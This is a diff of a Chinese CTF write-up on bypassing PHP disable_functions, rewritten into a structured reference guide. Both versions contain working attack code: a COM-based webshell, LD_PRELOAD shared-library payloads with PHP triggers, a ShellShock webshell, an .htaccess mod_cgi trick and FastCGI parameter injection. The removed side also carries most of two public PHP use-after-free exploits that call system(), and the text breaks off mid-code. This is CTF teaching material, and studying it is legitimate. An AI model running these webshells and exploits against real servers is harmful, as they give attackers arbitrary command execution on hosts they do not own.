@@ -1,1266 +1,741 @@
-disable_functions
-PHP的disable_functions配置可以用来设置PHP环境禁止使用某些函数,通常是网站管理员为了安全起见用来禁用某些危险的命令执行函数,通常网站不会禁用phpinfo,因此可以通过phpinfo函数检查环境配置漏过了哪些函数,如利用windows的COM对象,这需要php开启了php_com_dotnet.dll,从phpinfo中查看com.allow_dcom可判断是否开启dcom,payload如下:
-<?php
-$command = $_GET['cmd'];
-$wsh = new COM('WScript.shell'); // 生成一个COM对象　Shell.Application也能
-$exec = $wsh->exec("cmd /c".$command); //调用对象方法来执行命令
-$stdout = $exec->StdOut();
-$stroutput = $stdout->ReadAll();
-echo $stroutput;
-?>
+# PHP `disable_functions` 绕过技术
 
-1.LD_PRELOAD
-LD_PRELOAD是linux系统的一个环境变量,它可以影响程序的运行时的链接,允许定义在程序前优先加载的动态链接库,linux的动态链接库是.so文件,可以利用LD_PRELOAD来加载一个.so文件,覆盖正常的函数库中的函数,从而实现代码注入。
-因此可以使用mail函数,此函数会使用execve在父进程中fork一个子进程,调用/usr/sbin/sendmail,sendmail中又调用了getuid,所以可以编写一个动态库覆盖getuid函数。
-payload:
-#include <stdio.h>
-int getuid() {
-    unsetenv("LD_PRELOAD");
-    system("echo sussess > res");
-    return 0;
-}
-调整LD_PRELOAD变量,并调用PHP mail函数发送邮件,即可触发加载动态链接库,从而执行代码。
--
-__attribute__是GNU C里一种特殊的语法,语法格式为:__attribute__((attribute-list)),若函数被设定为constructor属性,则该函数会在main()函数执行之前被自动的执行。类似的,若函数被设定为destructor属性,则该函数会在main()函数执行之后或者exit()被调用后被自动的执行。所以__attribute__((constructor))在加载共享库时就会运行。只要编写一个含__attribute__((constructor))函数的共享库,设置好LD_PRELOAD变量,并且有一个能fork一个子进程并触发加载共享库的函数被执行,就能执行任意代码达到bypass disable_functions。
-payload:
-#include <stdio.h>
-__attribute__((constructor)) void my_init() {
-    unsetenv("LD_PRELOAD");
-    system("echo sussess > res");
-}
-调整LD_PRELOAD变量,并调用PHP mail函数发送邮件,即可触发加载动态链接库,从而执行代码。
--
-通用payload:
-evil.c
-#include<stdlib.h>
-__attribute__((constructor)) void l3yx(){
-    unsetenv("LD_PRELOAD");
-    system(getenv("_evilcmd"));
-}
-evil.php
-<?php
-$shell = $_GET['shell']." > /var/www/html/output.txt 2>&1";
-putenv("_evilcmd=$shell");
-putenv("LD_PRELOAD=./evil.so");
-if (function_exists('mail')) {
-    mail('a', 'a', 'a', 'a');
-} else {
-    error_log('a', 1, 'dummy@example.com'); 
-}
-echo "<pre>".file_get_contents("/var/www/html/output.txt")."</pre>";
-gcc -shared -fPIC -o evil.so evil.c
-使用条件:
-需要有putenv函数来指定LD变量,putenv("LD_PRELOAD=/tmp/evil.so");
-需要能够fork一个子进程的函数,如mail和error_log函数
-存在可写的目录能够上传.so文件
--
-现在来看题目,首先已经给出了一句话木马,蚁剑连上去即可
-![LD_PRELOAD 1](/ctfhub/images/web1.png)
-但后续发现无法在虚拟终端执行命令,因此将编译后的so文件与新的php文件都上传
-![LD_PRELOAD 2](/ctfhub/images/web2.png)
-获得flag,当然也可以直接使用蚁剑的绕过插件,不过做题最好还是懂得原理后再使用插件更好
-![LD_PRELOAD 3](/ctfhub/images/web3.png)
+## 概述 (Overview)
 
-2.ShellShock
-Bash4.3以及之前的版本在处理某些构造的环境变量时存在安全漏洞,向环境变量值内的函数定义后添加多余的字符串会触发此漏洞,攻击者可利用此漏洞改变或绕过环境限制,以执行任意的shell命令,甚至完全控制目标系统。
-payload：
-env x='() { :; }; echo 1' bash -c "echo 1"
-存在漏洞时输出有shellshock
-父进程中的特殊变量字符串(这里指字符串内容为函数)成为环境变量后,在子进程中调用该字符串时将其理解为函数执行
-当bash在初始化环境变量时,语法解析器发现小括号和大括号,就认为它是一个函数定义
-say_hell='() { echo hello world; }'
-export say_hello
-bash -c 'say_hello'
->>hello world
-在新的bash进程中,say_hello成为了新环境中的一个函数
-1、新的bash在初始化时,扫描到环境变量say_hello出现小括号和大括号,认为它是一个函数定义
-2、bash把say_hello作为函数名,值作为函数体
-分析源码可得知,bash初始化时调用了builtins/evalstring.c里的parse_and_execute函数,解析字符串输入并执行,但是又未对变量进行截取、过滤,导致读到}时没有结束,从而导致命令执行。
-使用条件:
-bash版本小于4.3
-攻击者可控制环境变量
-新的bash进程被打开触发漏洞并执行命令
--
-现在来看题目,在PHP webshell的环境下,基于以上使用条件,我们需要满足这几个函数的使用
-putenv控制环境变量
-mail or error_log来fork子进程触发bash命令执行
-bash版本小于4.3
-sh默认的shell是bash
-payload:
-<?php
-function runcmd($c){
-  $d = dirname($_SERVER["SCRIPT_FILENAME"]);
-  if(substr($d, 0, 1) == "/" && function_exists('putenv') && (function_exists('error_log') || function_exists('mail'))){
-    putenv("PHP_LOL=() { :; }; $c > /var/www/html/output.txt 2>&1");  //putenv控制环境变量
-    if (function_exists('error_log')) {  //触发漏洞
-        error_log("a", 1);
-    }else{
-        mail("a", "a", "a", "a");
-    }
-    echo "<pre>".file_get_contents("/var/www/html/output.txt")."</pre>";
-  }else{
-    print("不满足使用条件");
-  }
-}
-runcmd($_REQUEST["cmd"]); // ?cmd=whoami
-?>
-首页已经给出ant的连接密码
-![ShellShock 1](/ctfhub/images/web4.png)
-蚁剑连接后上传shellshock
-![ShellShock 2](/ctfhub/images/web5.png)
-获得flag,能用插件自动绕过
-![ShellShock 3](/ctfhub/images/web6.png)
+PHP 的 `php.ini` 配置文件中的 `disable_functions` 指令允许管理员禁止在 PHP 环境中使用某些特定的内置函数，通常是为了提高安全性，禁用诸如 `system()`, `exec()`, `shell_exec()`, `passthru()` 等可能执行操作系统命令的危险函数。绕过 `disable_functions` 的目标通常是在这种受限环境下找到替代方法来执行系统命令。`phpinfo()` 函数通常不会被禁用，是探测目标环境（如 PHP 版本、已加载扩展、`disable_functions` 具体列表等）的重要手段。
 
-3.Apache Mod CGI
-CGI,即公共网关接口,它是web服务器与CGI程序之间传递信息的借口,通过CGI接口web服务器就能够将客户端提交的信息转交给服务器端的CGI程序进行处理,最后返回结果给客户端。
-MOD_CGI是Apache的一个模块,它指示任何具有MIME类型application/x-httpd-cgi或者被cgi-script处理器处理的文件都被传递给CGI程序处理,输出将返回给客户端。有两种途径可以使文件成功CGI脚本,一种是文件具有已由AddType指令指定的MIME类型,另一种是文件位于ScriptAlias指定的目录中。
-使用条件:
-Linux系统
-使用的apache加上php
-apache开启了cgi,rewrite
-web目录给了AllowOverride权限
-当前目录可写
--
-因此想使得服务器将自定义的后缀解析为cgi程序,可以在目的目录下使用.htaccess文件进行配置,即需要AllowOverride权限的原因
-.htaccess文件内容如下:
-Options +ExecCGI
-AddHandler cgi-script .wors
-然后上传.wors文件后缀的shell脚本即可触发任意命令执行
--
-现在来看题目,已经有了一句话木马,蚁剑连接,当然也可以观察一下phpinfo()
-![Apache Mod CGI 1](/ctfhub/images/web7.png)
-然后上传.htaccess和shell脚本,注意shell脚本的执行权限
-![Apache Mod CGI 2](/ctfhub/images/web8.png)
-然后网页访问脚本即可getflag(忘记截图了),蚁剑的绕过插件也已经打包了,直接使用即可
+## 识别特征 / 使用场景 (Identification / Use Cases)
 
-4.PHP-FPM
-PHP-FPM,又名FastCGI进程管理器,服务器中间件将用户请求按照fastcgi的规则打包好通过TCP传给PHP-FPM进程,PHP-FPM按照fastcgi的协议将TCP流解析成真正的数据。而fastcgi协议就是一个通信协议,和HTTP、TCP等通信协议一样,都是基于字节流的协议,拥有header和body。因此,中间件按照它的规则封装好发送给后端,CGI程序则通过协议具体数据进行指定操作,将输出结果封装好返回中间件。格式如下:
-typedef struct {
-  /* Header */
-  unsigned char version; // 版本
-  unsigned char type; // 本次record的类型
-  unsigned char requestIdB1; // 本次record对应的请求id
-  unsigned char requestIdB0;
-  unsigned char contentLengthB1; // body体的大小
-  unsigned char contentLengthB0;
-  unsigned char paddingLength; // 额外块大小
-  unsigned char reserved; 
+*   **识别:**
+    *   获取 WebShell 后，尝试执行 `whoami`, `ls` 等命令失败，提示函数被禁用。
+    *   通过 `phpinfo()` 输出查看到 `disable_functions` 指令及其列出的被禁函数。
+*   **使用场景:**
+    *   在已获得 WebShell 但无法直接执行系统命令的 PHP 环境中提升权限或执行进一步操作。
+    *   适用于满足特定绕过技术条件的 Linux 或 Windows 服务器环境。
 
-  /* Body */
-  unsigned char contentData[contentLength];
-  unsigned char paddingData[paddingLength];
-} FCGI_Record;
-头由8个uchar类型的变量组成,每个变量1字节。其中,requestId占两个字节,一个唯一的标志id,以避免多个请求之间的影响contentLength占两个字节,表示body的大小。
-语言端解析了fastcgi头以后,拿到contentLength,然后再在TCP流里读取大小等于contentLength的数据,这就是body体。
-Body后面还有一段额外的数据(Padding),其长度由头中的paddingLength指定,起保留作用。不需要该Padding的时候，将其长度设置为0即可。
-可见,一个fastcgi record结构最大支持的body大小是2^16,也就是65536字节。
-其中的type字段指定了record的类型,重要的是类型4,当后端语言接收到一个type为4的record后,就会把这个record的body按照对应的结构解析成key-value对,这就是环境变量。环境变量的结构如下:
-typedef struct {
-  unsigned char nameLengthB0;  /* nameLengthB0  >> 7 == 0 */
-  unsigned char valueLengthB0; /* valueLengthB0 >> 7 == 0 */
-  unsigned char nameData[nameLength];
-  unsigned char valueData[valueLength];
-} FCGI_NameValuePair11;
- 
-typedef struct {
-  unsigned char nameLengthB0;  /* nameLengthB0  >> 7 == 0 */
-  unsigned char valueLengthB3; /* valueLengthB3 >> 7 == 1 */
-  unsigned char valueLengthB2;
-  unsigned char valueLengthB1;
-  unsigned char valueLengthB0;
-  unsigned char nameData[nameLength];
-  unsigned char valueData[valueLength
-          ((B3 & 0x7f) << 24) + (B2 << 16) + (B1 << 8) + B0];
-} FCGI_NameValuePair14;
- 
-typedef struct {
-  unsigned char nameLengthB3;  /* nameLengthB3  >> 7 == 1 */
-  unsigned char nameLengthB2;
-  unsigned char nameLengthB1;
-  unsigned char nameLengthB0;
-  unsigned char valueLengthB0; /* valueLengthB0 >> 7 == 0 */
-  unsigned char nameData[nameLength
-          ((B3 & 0x7f) << 24) + (B2 << 16) + (B1 << 8) + B0];
-  unsigned char valueData[valueLength];
-} FCGI_NameValuePair41;
- 
-typedef struct {
-  unsigned char nameLengthB3;  /* nameLengthB3  >> 7 == 1 */
-  unsigned char nameLengthB2;
-  unsigned char nameLengthB1;
-  unsigned char nameLengthB0;
-  unsigned char valueLengthB3; /* valueLengthB3 >> 7 == 1 */
-  unsigned char valueLengthB2;
-  unsigned char valueLengthB1;
-  unsigned char valueLengthB0;
-  unsigned char nameData[nameLength
-          ((B3 & 0x7f) << 24) + (B2 << 16) + (B1 << 8) + B0];
-  unsigned char valueData[valueLength
-          ((B3 & 0x7f) << 24) + (B2 << 16) + (B1 << 8) + B0];
-} FCGI_NameValuePair44;
-这其实是4个结构,至于用哪个结构,有如下规则:
-key、value均小于128字节,用FCGI_NameValuePair11
-key大于128字节,value小于128字节,用FCGI_NameValuePair41
-key小于128字节,value大于128字节,用FCGI_NameValuePair14
-key、value均大于128字节,用FCGI_NameValuePair44
--
-因此,但用户访问网页时,中间件会把访问请求转变为fastcgi协议,假设访问的是http://127.0.0.1/index.php?a=1&b=2,这个请求会变成如下key-value:
-{
-    'GATEWAY_INTERFACE': 'FastCGI/1.0',
-    'REQUEST_METHOD': 'GET',
-    'SCRIPT_FILENAME': '/var/www/html/index.php',
-    'SCRIPT_NAME': '/index.php',
-    'QUERY_STRING': '?a=1&b=2',
-    'REQUEST_URI': '/index.php?a=1&b=2',
-    'DOCUMENT_ROOT': '/var/www/html',
-    'SERVER_SOFTWARE': 'php/fcgiclient',
-    'REMOTE_ADDR': '127.0.0.1',
-    'REMOTE_PORT': '12345',
-    'SERVER_ADDR': '127.0.0.1',
-    'SERVER_PORT': '80',
-    'SERVER_NAME': "localhost",
-    'SERVER_PROTOCOL': 'HTTP/1.1'
-}
-这个数组其实就是PHP中$_SERVER数组的一部分,也就是PHP里的环境变量。但环境变量的作用不仅是填充$_SERVER数组,也是告诉fpm:“我要执行哪个PHP文件”。
-PHP-FPM拿到fastcgi的数据包后,进行解析,得到上述这些环境变量。然后,执行SCRIPT_FILENAME的值指向的PHP文件,也就是/var/www/html/index.php。
-而对php-fpm的利用方法也就呼之欲出,PHP-FPM默认监听9000端口,如果这个端口暴露在公网,则可以自己构造fastcgi协议,和fpm进行通信。
-此时,SCRIPT_FILENAME的值就格外重要,因为fpm是根据这个值来执行php文件的,如果这个文件不存在,fpm会直接返回404
-主要是fpm的默认配置中增加了一个选项security.limit_extensions,限定了只有某些后缀的文件允许被fpm执行,默认是.php。
-由于这个配置项的限制,如果想利用PHP-FPM的未授权访问漏洞,首先就得找到一个已存在的PHP文件。
--
-当然,能够控制fastcgi协议通信的内容并不能执行任意php代码,还需要auto_prepend_file和auto_append_file配置项。auto_prepend_file是告诉PHP,在执行目标文件之前,先包含auto_prepend_file中指定的文件;auto_append_file是告诉PHP,在执行完成目标文件后,包含auto_append_file指向的文件。
-假设设置auto_prepend_file为php://input,那么就等于在执行任何php文件前都要包含一遍POST的内容。所以,只需要把待执行的代码放在Body中,他们就能被执行了。还需要开启远程文件包含选项allow_url_include。
-PHP_VALUE和PHP_ADMIN_VALUE。这两个环境变量可以用来设置PHP配置项的,PHP_VALUE可以设置模式为PHP_INI_USER和PHP_INI_ALL的选项,PHP_ADMIN_VALUE可以设置所有选项。所以构造payload如下:
-{
-    'GATEWAY_INTERFACE': 'FastCGI/1.0',
-    'REQUEST_METHOD': 'GET',
-    'SCRIPT_FILENAME': '/var/www/html/index.php',
-    'SCRIPT_NAME': '/index.php',
-    'QUERY_STRING': '?a=1&b=2',
-    'REQUEST_URI': '/index.php?a=1&b=2',
-    'DOCUMENT_ROOT': '/var/www/html',
-    'SERVER_SOFTWARE': 'php/fcgiclient',
-    'REMOTE_ADDR': '127.0.0.1',
-    'REMOTE_PORT': '12345',
-    'SERVER_ADDR': '127.0.0.1',
-    'SERVER_PORT': '80',
-    'SERVER_NAME': "localhost",
-    'SERVER_PROTOCOL': 'HTTP/1.1'
-    'PHP_VALUE': 'auto_prepend_file = php://input',
-    'PHP_ADMIN_VALUE': 'allow_url_include = On'
-}
-设置auto_prepend_file = php://input且allow_url_include = On,然后将我们需要执行的代码放在Body中,即可执行任意代码。
--
-现在来看题目,我们已经获得了可用于连接的一句话木马,但disable_functions限制了可用于执行系统命令的函数,如果只使用php未授权访问漏洞来执行命令,这种情况还是原来的php解释器来解析,依然会加载php.ini,从而导致disable_functions完全加载限制利用。分析蚁剑的绕过插件可以得知,可以利用php-fpm加载一个恶意的ext,新启动一个php server,让流量通过.antproxy.php转发到无disabe_functions的PHP Server上,以此达成bypass。
-我们需要存在可写的目录,能够上传.so文件,使用php-fpm
--
-已经有了一句话木马,蚁剑连接
-![PHP-FPM 1](/ctfhub/images/web9.png)
-插件利用
-![PHP-FPM 2](/ctfhub/images/web10.png)
-getflag
-![PHP-FPM 3](/ctfhub/images/web11.png)
+## 核心原理 (Core Principles - General)
 
-5.GC UAF
-UAF
-UAF漏洞（Use-After-Free）是一种内存破坏漏洞,漏洞成因是一块堆内存被释放了之后又被使用。又被使用指的是:指针存在（悬垂指针被引用）。这个引用的结果是不可预测的,因为不知道会发生什么。由于大多数的堆内存其实都是C++对象,所以利用的核心思路就是分配堆去占坑,占的坑中有自己构造的虚表。
-悬垂指针:悬垂指针是指一类不指向任何合法的或者有效的（即与指针的含义不符）的对象的指针。比如一个对象的指针,如果这个对象已经被释放或者回收但是指针没有进行任何的修改仍然执行已被释放的内存,这个指针就叫做悬垂指针。
--
-此漏洞利用PHP垃圾收集器(garbage collector)中存在三年的一个bug,通过PHP垃圾收集器中堆溢出来绕过disable_functions并执行系统命令。
-需要php版本在7.0-7.3
-参考exploit
-<?php
+绕过 `disable_functions` 的核心思路是寻找 PHP 与操作系统交互的替代途径，常见的原理包括：
 
-# PHP 7.0-7.3 disable_functions bypass PoC (*nix only)
-#
-# Bug: https://bugs.php.net/bug.php?id=72530
-#
-# This exploit should work on all PHP 7.0-7.3 versions
-#
-# Author: https://github.com/mm0r1
+1.  **利用未被禁用的、可执行命令或加载代码的函数/特性:** 如 Windows 下的 `COM` 对象。
+2.  **利用环境变量和子进程:** 通过设置特殊环境变量（如 `LD_PRELOAD`, `GCONV_PATH`）并触发能创建子进程的函数（如 `mail()`, `error_log()`），使得子进程加载恶意代码。
+3.  **利用 Web 服务器特定模块:** 如 Apache 的 `mod_cgi`，通过配置文件修改文件处理方式。
+4.  **攻击 PHP-FPM 进程:** 如果能与 PHP-FPM 进程通信（通常监听 9000 端口），可以构造 FastCGI 请求来控制 PHP 配置项并执行代码。
+5.  **利用 PHP 自身漏洞 (内存破坏):** 如特定版本存在的 UAF (Use-After-Free) 漏洞，通过精心构造的数据触发漏洞，最终劫持执行流程以调用 `system()` 等函数。
+6.  **利用 PHP 新特性/扩展:** 如 PHP 7.4 引入的 FFI (Foreign Function Interface) 扩展。
 
-pwn("tac /flag");            // 可替换成需要执行的命令
+---
 
-function pwn($cmd) {
-    global $abc, $helper;
+## 常见绕过技术 (Common Bypass Techniques)
 
-    function str2ptr(&$str, $p = 0, $s = 8) {
-        $address = 0;
-        for($j = $s-1; $j >= 0; $j--) {
-            $address <<= 8;
-            $address |= ord($str[$p+$j]);
+### 1. Windows COM 对象
+
+*   **概述 (Overview):** 在 Windows 环境下，如果 PHP 加载了 `php_com_dotnet.dll` 扩展且允许 DCOM (`com.allow_dcom=true`)，可以通过 `COM` 对象调用系统组件（如 `WScript.shell`）来执行命令。
+*   **工作原理 (Working Principle):** PHP 的 `COM` 类允许实例化和调用 COM 对象。`WScript.Shell` 对象提供了 `Exec` 方法，可以启动外部程序并获取其输出。
+*   **利用条件 (Exploitation Conditions):**
+    *   Windows 操作系统。
+    *   PHP 开启 `php_com_dotnet.dll` 扩展。
+    *   `phpinfo()` 中 `com.allow_dcom` 为 `On`。
+    *   `COM` 类未被禁用。
+*   **利用步骤 / 示例 Payload (Exploitation Steps / Example Payload):**
+    ```php
+    <?php
+    // 检查 COM 是否可用
+    if (extension_loaded('com_dotnet')) {
+        try {
+            $command = $_GET['cmd'];
+            // 创建 WScript.Shell COM 对象
+            $wsh = new COM('WScript.shell'); 
+            // 执行命令 (Shell.Application 对象的 ShellExecute 方法也可以)
+            $exec = $wsh->exec("cmd /c " . $command); 
+            // 获取标准输出
+            $stdout = $exec->StdOut();
+            $stroutput = $stdout->ReadAll();
+            echo "<pre>" . htmlspecialchars($stroutput) . "</pre>";
+        } catch (Exception $e) {
+            echo "COM Error: " . $e->getMessage();
         }
-        return $address;
+    } else {
+        echo "COM extension is not loaded.";
     }
+    ?>
+    ```
+    访问 `payload.php?cmd=whoami` 即可执行命令。
 
-    function ptr2str($ptr, $m = 8) {
-        $out = "";
-        for ($i=0; $i < $m; $i++) {
-            $out .= chr($ptr & 0xff);
-            $ptr >>= 8;
-        }
-        return $out;
-    }
+### 2. LD_PRELOAD (Linux)
 
-    function write(&$str, $p, $v, $n = 8) {
-        $i = 0;
-        for($i = 0; $i < $n; $i++) {
-            $str[$p + $i] = chr($v & 0xff);
-            $v >>= 8;
-        }
-    }
+*   **概述 (Overview):** `LD_PRELOAD` 是 Linux 动态链接器的一个环境变量。它允许用户指定在程序启动时优先加载的共享库 (`.so` 文件)。通过加载一个恶意的共享库，可以覆盖（劫持）目标进程将要调用的库函数（如 `getuid`），在被劫持的函数中执行任意代码。
+*   **工作原理 (Working Principle):**
+    1.  **编写恶意共享库 (`.so`):** 使用 C 语言编写一个共享库，其中包含一个与目标进程将要调用的函数同名的函数（如 `getuid`）。在这个自定义函数内部，执行我们想要执行的命令，并通常使用 `unsetenv("LD_PRELOAD")` 清除环境变量以防无限循环。
+    2.  **利用 `__attribute__((constructor))`:** 更通用的方法是利用 GCC 的 `__attribute__((constructor))` 特性。标记为此属性的函数会在共享库被加载时（早于 `main` 函数执行）自动执行。这样就不需要精确劫持某个特定函数。
+    3.  **设置环境变量:** 使用 PHP 的 `putenv()` 函数设置 `LD_PRELOAD` 环境变量，指向我们上传的恶意 `.so` 文件路径。
+    4.  **触发子进程:** 调用一个能够 fork 出子进程的 PHP 函数，如 `mail()` 或 `error_log()`。当子进程启动时，它会继承父进程的环境变量，动态链接器会根据 `LD_PRELOAD` 加载我们的恶意 `.so` 文件，从而执行其中的代码。
+*   **利用条件 (Exploitation Conditions):**
+    *   Linux 操作系统。
+    *   `putenv()` 函数可用。
+    *   至少有一个能触发子进程的函数可用 (如 `mail()`, `error_log()`, `imagick` 扩展处理某些图片等)。
+    *   目标网站有可写的目录，允许上传编译好的 `.so` 文件。
+*   **利用步骤 / 示例 Payload (Exploitation Steps / Example Payload):**
+    1.  **编写 `evil.c`:**
+        ```c
+        #include <stdlib.h>
+        #include <unistd.h> // 如果需要 getuid 等
 
-    function leak($addr, $p = 0, $s = 8) {
-        global $abc, $helper;
-        write($abc, 0x68, $addr + $p - 0x10);
-        $leak = strlen($helper->a);
-        if($s != 8) { $leak %= 2 << ($s * 8) - 1; }
-        return $leak;
-    }
+        // 可选：如果想劫持特定函数（例如 mail() 调用的 getuid）
+        // uid_t getuid(void) {
+        //     unsetenv("LD_PRELOAD");
+        //     system("echo 'Hooked getuid!' > /tmp/ld_preload_success.txt");
+        //     system(getenv("_evilcmd")); // 通过另一个环境变量传递命令
+        //     return geteuid(); // 返回原始函数应该做的事
+        // }
 
-    function parse_elf($base) {
-        $e_type = leak($base, 0x10, 2);
-
-        $e_phoff = leak($base, 0x20);
-        $e_phentsize = leak($base, 0x36, 2);
-        $e_phnum = leak($base, 0x38, 2);
-
-        for($i = 0; $i < $e_phnum; $i++) {
-            $header = $base + $e_phoff + $i * $e_phentsize;
-            $p_type  = leak($header, 0, 4);
-            $p_flags = leak($header, 4, 4);
-            $p_vaddr = leak($header, 0x10);
-            $p_memsz = leak($header, 0x28);
-
-            if($p_type == 1 && $p_flags == 6) { # PT_LOAD, PF_Read_Write
-                # handle pie
-                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;
-                $data_size = $p_memsz;
-            } else if($p_type == 1 && $p_flags == 5) { # PT_LOAD, PF_Read_exec
-                $text_size = $p_memsz;
+        // 推荐：使用 constructor，更通用
+        __attribute__((constructor)) void evil_constructor() {
+            unsetenv("LD_PRELOAD"); // 清除环境变量防止影响后续进程
+            const char* cmd = getenv("_evilcmd"); // 从环境变量获取命令
+            if (cmd != NULL) {
+                system(cmd);
+            } else {
+                system("echo 'LD_PRELOAD success but _evilcmd not set' > /tmp/ld_preload_fallback.txt");
             }
         }
-
-        if(!$data_addr || !$text_size || !$data_size)
-            return false;
-
-        return [$data_addr, $text_size, $data_size];
-    }
-
-    function get_basic_funcs($base, $elf) {
-        list($data_addr, $text_size, $data_size) = $elf;
-        for($i = 0; $i < $data_size / 8; $i++) {
-            $leak = leak($data_addr, $i * 8);
-            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
-                $deref = leak($leak);
-                # 'constant' constant check
-                if($deref != 0x746e6174736e6f63)
-                    continue;
-            } else continue;
-
-            $leak = leak($data_addr, ($i + 4) * 8);
-            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
-                $deref = leak($leak);
-                # 'bin2hex' constant check
-                if($deref != 0x786568326e6962)
-                    continue;
-            } else continue;
-
-            return $data_addr + $i * 8;
-        }
-    }
-
-    function get_binary_base($binary_leak) {
-        $base = 0;
-        $start = $binary_leak & 0xfffffffffffff000;
-        for($i = 0; $i < 0x1000; $i++) {
-            $addr = $start - 0x1000 * $i;
-            $leak = leak($addr, 0, 7);
-            if($leak == 0x10102464c457f) { # ELF header
-                return $addr;
-            }
-        }
-    }
-
-    function get_system($basic_funcs) {
-        $addr = $basic_funcs;
-        do {
-            $f_entry = leak($addr);
-            $f_name = leak($f_entry, 0, 6);
-
-            if($f_name == 0x6d6574737973) { # system
-                return leak($addr + 8);
-            }
-            $addr += 0x20;
-        } while($f_entry != 0);
-        return false;
-    }
-
-    class ryat {
-        var $ryat;
-        var $chtg;
-        
-        function __destruct()
-        {
-            $this->chtg = $this->ryat;
-            $this->ryat = 1;
-        }
-    }
-
-    class Helper {
-        public $a, $b, $c, $d;
-    }
-
-    if(stristr(PHP_OS, 'WIN')) {
-        die('This PoC is for *nix systems only.');
-    }
-
-    $n_alloc = 10; # increase this value if you get segfaults
-
-    $contiguous = [];
-    for($i = 0; $i < $n_alloc; $i++)
-        $contiguous[] = str_repeat('A', 79);
-
-    $poc = 'a:4:{i:0;i:1;i:1;a:1:{i:0;O:4:"ryat":2:{s:4:"ryat";R:3;s:4:"chtg";i:2;}}i:1;i:3;i:2;R:5;}';
-    $out = unserialize($poc);
-    gc_collect_cycles();
-
-    $v = [];
-    $v[0] = ptr2str(0, 79);
-    unset($v);
-    $abc = $out[2][0];
-
-    $helper = new Helper;
-    $helper->b = function ($x) { };
-
-    if(strlen($abc) == 79 || strlen($abc) == 0) {
-        die("UAF failed");
-    }
-
-    # leaks
-    $closure_handlers = str2ptr($abc, 0);
-    $php_heap = str2ptr($abc, 0x58);
-    $abc_addr = $php_heap - 0xc8;
-
-    # fake value
-    write($abc, 0x60, 2);
-    write($abc, 0x70, 6);
-
-    # fake reference
-    write($abc, 0x10, $abc_addr + 0x60);
-    write($abc, 0x18, 0xa);
-
-    $closure_obj = str2ptr($abc, 0x20);
-
-    $binary_leak = leak($closure_handlers, 8);
-    if(!($base = get_binary_base($binary_leak))) {
-        die("Couldn't determine binary base address");
-    }
-
-    if(!($elf = parse_elf($base))) {
-        die("Couldn't parse ELF header");
-    }
-
-    if(!($basic_funcs = get_basic_funcs($base, $elf))) {
-        die("Couldn't get basic_functions address");
-    }
-
-    if(!($zif_system = get_system($basic_funcs))) {
-        die("Couldn't get zif_system address");
-    }
-
-    # fake closure object
-    $fake_obj_offset = 0xd0;
-    for($i = 0; $i < 0x110; $i += 8) {
-        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));
-    }
-
-    # pwn
-    write($abc, 0x20, $abc_addr + $fake_obj_offset);
-    write($abc, 0xd0 + 0x38, 1, 4); # internal func type
-    write($abc, 0xd0 + 0x68, $zif_system); # internal func handler
-
-    ($helper->b)($cmd);
-
-    exit();
-}
--
-已经有了一句话木马,蚁剑连接
-![GC UAF 1](/ctfhub/images/web12.png)
-上传exploit
-![GC UAF 2](/ctfhub/images/web13.png)
-getflag
-![GC UAF 3](/ctfhub/images/web14.png)
-
-6.Json Serialization UAF
-此漏洞利用json序列化程序中的释放后使用漏洞,利用json序列化程序中的堆溢出触发,以绕过disable_functions和执行系统命令。尽管不能保证成功,但它应该相当可靠的在所有服务器api上使用。
-Linux 操作系统
-PHP 7.1 - all versions to date
-7.2 < 7.2.19 (released: 30 May 2019)
-7.3 < 7.3.6 (released: 30 May 2019)
-exploit:
-<?php
-
-$cmd = "tac /flag";        // 可替换成需要执行的命令
-
-$n_alloc = 10; # increase this value if you get segfaults
-
-class MySplFixedArray extends SplFixedArray {
-    public static $leak;
-}
-
-class Z implements JsonSerializable {
-    public function write(&$str, $p, $v, $n = 8) {
-      $i = 0;
-      for($i = 0; $i < $n; $i++) {
-        $str[$p + $i] = chr($v & 0xff);
-        $v >>= 8;
-      }
-    }
-
-    public function str2ptr(&$str, $p = 0, $s = 8) {
-        $address = 0;
-        for($j = $s-1; $j >= 0; $j--) {
-            $address <<= 8;
-            $address |= ord($str[$p+$j]);
-        }
-        return $address;
-    }
-
-    public function ptr2str($ptr, $m = 8) {
-        $out = "";
-        for ($i=0; $i < $m; $i++) {
-            $out .= chr($ptr & 0xff);
-            $ptr >>= 8;
-        }
-        return $out;
-    }
-
-    # unable to leak ro segments
-    public function leak1($addr) {
-        global $spl1;
-
-        $this->write($this->abc, 8, $addr - 0x10);
-        return strlen(get_class($spl1));
-    }
-
-    # the real deal
-    public function leak2($addr, $p = 0, $s = 8) {
-        global $spl1, $fake_tbl_off;
-
-        # fake reference zval
-        $this->write($this->abc, $fake_tbl_off + 0x10, 0xdeadbeef); # gc_refcounted
-        $this->write($this->abc, $fake_tbl_off + 0x18, $addr + $p - 0x10); # zval
-        $this->write($this->abc, $fake_tbl_off + 0x20, 6); # type (string)
-
-        $leak = strlen($spl1::$leak);
-        if($s != 8) { $leak %= 2 << ($s * 8) - 1; }
-
-        return $leak;
-    }
-
-    public function parse_elf($base) {
-        $e_type = $this->leak2($base, 0x10, 2);
-
-        $e_phoff = $this->leak2($base, 0x20);
-        $e_phentsize = $this->leak2($base, 0x36, 2);
-        $e_phnum = $this->leak2($base, 0x38, 2);
-
-        for($i = 0; $i < $e_phnum; $i++) {
-            $header = $base + $e_phoff + $i * $e_phentsize;
-            $p_type  = $this->leak2($header, 0, 4);
-            $p_flags = $this->leak2($header, 4, 4);
-            $p_vaddr = $this->leak2($header, 0x10);
-            $p_memsz = $this->leak2($header, 0x28);
-
-            if($p_type == 1 && $p_flags == 6) { # PT_LOAD, PF_Read_Write
-                # handle pie
-                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;
-                $data_size = $p_memsz;
-            } else if($p_type == 1 && $p_flags == 5) { # PT_LOAD, PF_Read_exec
-                $text_size = $p_memsz;
-            }
+        ```
+    2.  **编译 `.so` 文件:**
+        ```bash
+        gcc -shared -fPIC -o evil.so evil.c 
+        ```
+        (`-shared` 生成共享库, `-fPIC` 生成位置无关代码)
+    3.  **编写 `trigger.php`:**
+        ```php
+        <?php
+        // 获取要执行的命令，例如从 GET 参数
+        $command = $_GET['cmd']; 
+        if (empty($command)) {
+            $command = "id"; // 默认命令
         }
 
-        if(!$data_addr || !$text_size || !$data_size)
-            return false;
-
-        return [$data_addr, $text_size, $data_size];
-    }
-
